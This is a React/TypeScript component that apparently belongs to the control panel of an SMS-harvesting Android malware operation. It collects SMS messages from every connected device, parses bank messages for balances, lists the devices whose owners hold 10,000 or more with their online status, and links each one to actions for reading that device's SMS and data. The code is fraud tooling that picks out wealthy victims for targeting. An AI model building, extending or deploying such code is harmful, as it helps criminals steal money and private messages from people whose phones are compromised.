import React, { useEffect, useState, useMemo } from 'react';
import { fetchGlobalSMS, subscribeToUsers } from '../services/firebase';
import { detectBanks, extractBalance } from '../services/bankUtils';
import { SMS, DeviceInfo } from '../types';

interface Props {
  onBack: () => void;
  onSelectUserForSMS: (user: DeviceInfo) => void;
  onSelectUserForData: (user: DeviceInfo) => void;
  onViewUser: (user: DeviceInfo) => void;
}

interface BalanceEntry {
  userId: string;
  deviceId: string; 
  bankName: string;
  amount: string;
  timestamp: number;
}

const BankBalanceSummary: React.FC<Props> = ({ 
  onBack, 
  onSelectUserForSMS, 
  onSelectUserForData, 
  onViewUser 
}) => {
  const [loading, setLoading] = useState(true);
  const [entries, setEntries] = useState<BalanceEntry[]>([]);
  const [devices, setDevices] = useState<DeviceInfo[]>([]);
  const [sortField, setSortField] = useState<'timestamp' | 'amount' | 'bank'>('timestamp');

  // Real-time devices for status and mapping
  useEffect(() => {
    const unsub = subscribeToUsers(setDevices);
    return () => unsub();
  }, []);

  useEffect(() => {
    const loadData = async () => {
      setLoading(true);
      try {
        const allSms = await fetchGlobalSMS();
        const userMap = new Map<string, BalanceEntry>();

        allSms.forEach(sms => {
          if (!sms.body) return;
          const banks = detectBanks(sms.sender + ' ' + sms.body);
          if (banks.length > 0) {
            const balanceStr = extractBalance(sms.body);
            if (balanceStr) {
              // Minimum balance threshold 10,000 for "highest amount tracking"
              const numericVal = parseFloat(balanceStr.replace(/,/g, ''));
              if (numericVal >= 10000) {
                const currentEntry = userMap.get(sms.userId);
                if (!currentEntry || sms.timestamp > currentEntry.timestamp) {
                  userMap.set(sms.userId, {
                    userId: sms.userId,
                    deviceId: sms.androidId || sms.userId,
                    bankName: banks[0], 
                    amount: balanceStr,
                    timestamp: sms.timestamp
                  });
                }
              }
            }
          }
        });

        setEntries(Array.from(userMap.values()));
      } catch (err) {
        console.error(err);
      } finally {
        setLoading(false);
      }
    };
    loadData();
  }, []);

  const sortedEntries = useMemo(() => {
    return [...entries].sort((a, b) => {
      if (sortField === 'timestamp') return b.timestamp - a.timestamp;
      if (sortField === 'bank') return a.bankName.localeCompare(b.bankName);
      if (sortField === 'amount') {
        const valA = parseFloat(String(a.amount).replace(/,/g, ''));
        const valB = parseFloat(String(b.amount).replace(/,/g, ''));
        return valB - valA;
      }
      return 0;
    });
  }, [entries, sortField]);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  const getDeviceInfo = (userId: string) => {
      return devices.find(d => d.userId === userId);
  };

  return (
    <div className="h-full flex flex-col bg-gray-50">
      <header className="bg-white px-6 py-4 shadow-sm border-b border-gray-200 flex items-center sticky top-0 z-20 flex-none">
        <button onClick={onBack} className="mr-4 p-2 rounded-full hover:bg-gray-100 text-gray-600 transition-colors focus:outline-none">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
          </svg>
        </button>
        <div>
           <h1 className="font-bold text-xl text-gray-900">Bank Balance Summary</h1>
           <p className="text-xs text-gray-500">Latest balance per unique device (Min. 10,000)</p>
        </div>
      </header>

      <div className="flex-1 overflow-auto p-4 md:p-6">
        {loading ? (
           <div className="flex justify-center mt-20">
             <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-app-green"></div>
           </div>
        ) : entries.length === 0 ? (
           <div className="flex flex-col items-center justify-center h-64 text-gray-400 border-2 border-dashed border-gray-200 rounded-xl bg-gray-50/50">
             <p className="font-medium">No balance data detected over 10,000</p>
           </div>
        ) : (
          <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
             <div className="overflow-x-auto">
               <table className="w-full text-left text-sm">
                 <thead className="bg-gray-50 border-b border-gray-200">
                   <tr>
                     <th className="px-6 py-3 font-bold text-gray-500 uppercase tracking-wider text-xs whitespace-nowrap">Status</th>
                     <th className="px-6 py-3 font-bold text-gray-500 uppercase tracking-wider text-xs whitespace-nowrap">Device Info</th>
                     <th className="px-6 py-3 font-bold text-gray-500 uppercase tracking-wider text-xs cursor-pointer hover:text-gray-700 whitespace-nowrap" onClick={()=>setSortField('bank')}>
                        Bank {sortField==='bank' && '↓'}
                     </th>
                     <th className="px-6 py-3 font-bold text-gray-500 uppercase tracking-wider text-xs cursor-pointer hover:text-gray-700 whitespace-nowrap" onClick={()=>setSortField('amount')}>
                        Balance {sortField==='amount' && '↓'}
                     </th>
                     <th className="px-6 py-3 font-bold text-gray-500 uppercase tracking-wider text-xs cursor-pointer hover:text-gray-700 whitespace-nowrap" onClick={()=>setSortField('timestamp')}>
                        Detected {sortField==='timestamp' && '↓'}
                     </th>
                     <th className="px-6 py-3 font-bold text-gray-500 uppercase tracking-wider text-xs whitespace-nowrap">Actions</th>
                   </tr>
                 </thead>
                 <tbody className="divide-y divide-gray-100">
                   {sortedEntries.map((entry) => {
                     const device = getDeviceInfo(entry.userId);
                     return (
                       <tr key={entry.userId} className="hover:bg-gray-50 transition-colors">
                         <td className="px-6 py-4">
                            <span className={`text-[10px] uppercase font-bold px-2 py-0.5 rounded-full ${device?.Status === 'Online' ? 'bg-green-100 text-green-700' : 'bg-gray-100 text-gray-400'}`}>
                                {device?.Status || 'Offline'}
                            </span>
                         </td>
                         <td className="px-6 py-4">
                           <div className="flex flex-col min-w-0">
                               <span className="font-bold text-gray-800 text-xs truncate max-w-[120px]">{device?.Brand || 'Unknown Device'}</span>
                               <div className="flex items-center space-x-1 mt-0.5">
                                   <span className="font-mono text-gray-400 text-[10px] truncate max-w-[100px]">{entry.deviceId}</span>
                                   <button onClick={()=>copyToClipboard(entry.deviceId)} className="text-gray-300 hover:text-app-green transition-colors">
                                       <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
                                   </button>
                               </div>
                           </div>
                         </td>
                         <td className="px-6 py-4">
                           <span className="px-2 py-1 bg-blue-50 text-blue-700 rounded-full text-xs font-bold border border-blue-100">{entry.bankName}</span>
                         </td>
                         <td className="px-6 py-4 font-mono font-bold text-gray-900 text-base">
                           {entry.amount}
                         </td>
                         <td className="px-6 py-4 text-gray-500 text-xs whitespace-nowrap">
                           {new Date(entry.timestamp).toLocaleString()}
                         </td>
                         <td className="px-6 py-4">
                            <div className="flex items-center space-x-1">
                                <button 
                                    onClick={() => device && onSelectUserForSMS(device)} 
                                    disabled={!device}
                                    className="p-2 text-gray-600 hover:text-app-green hover:bg-app-green/10 rounded transition-colors disabled:opacity-20"
                                    title="SMS"
                                >
                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" /></svg>
                                </button>
                                <button 
                                    onClick={() => device && onSelectUserForData(device)} 
                                    disabled={!device}
                                    className="p-2 text-gray-600 hover:text-blue-600 hover:bg-blue-50 rounded transition-colors disabled:opacity-20"
                                    title="Data"
                                >
                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" /></svg>
                                </button>
                                <button 
                                    onClick={() => device && onViewUser(device)} 
                                    disabled={!device}
                                    className="p-2 text-gray-600 hover:text-purple-600 hover:bg-purple-50 rounded transition-colors disabled:opacity-20"
                                    title="View on Dashboard"
                                >
                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" /></svg>
                                </button>
                            </div>
                         </td>
                       </tr>
                     );
                   })}
                 </tbody>
               </table>
             </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default BankBalanceSummary;